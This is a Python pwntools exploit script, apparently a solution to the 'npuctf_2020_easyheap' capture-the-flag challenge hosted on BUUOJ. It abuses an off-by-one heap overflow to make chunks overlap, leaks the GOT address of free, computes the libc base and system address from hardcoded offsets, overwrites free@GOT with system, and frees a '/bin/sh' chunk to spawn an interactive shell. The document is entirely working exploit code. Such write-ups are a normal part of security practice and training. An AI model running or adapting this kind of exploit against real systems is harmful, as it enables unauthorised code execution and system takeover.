from pwn import *
local=1
if local :
	r=process('./new')
else:
	r=remote('node4.buuoj.cn','29630')
elf=ELF('npuctf_2020_easyheapr')
free=elf.got['free']
context.log_level="debug"
def add(size,content):
	r.sendlineafter('Your choice :',str(1))
	r.sendlineafter('Size of Heap(0x10 or 0x20 only) : ',str(size))
	r.sendafter('Content:',content)

def edit(index,content):
	r.sendlineafter('Your choice :',str(2))
	r.sendafter('Index :',str(index))
	r.recvuntil("Content: ")
	r.send(content)

def show(idx):
	r.sendlineafter('Your choice :',str(3))
	r.sendlineafter('Index :',str(idx))

def dele(idx):
	r.sendlineafter('Your choice :',str(4))
	r.sendlineafter('Index :',str(idx))


add(0x18,'ni')#0
add(0x18,'wo')#1
add(0x18,'/bin/sh\x00')#2
payload='\x00'*24+'\x41'
edit(0,payload)
dele(1)
#gdb.attach(r)

payload=p64(0)*3+p64(0x21)+p64(100)+p64(free)
add(0x38,payload)
#gdb.attach(r)

show(1)
r.recvuntil('Content : ')
leak=u64(r.recv(6).ljust(8,'\x00'))
log.success('leak:'+hex(leak))
if local :
	base=leak-0x097a30
	sys=base+0x04f550
else:
	base=leak-0x097950
	sys=base+0x04f440
edit(1,p64(sys))
gdb.attach(r)
dele(2)
r.interactive()
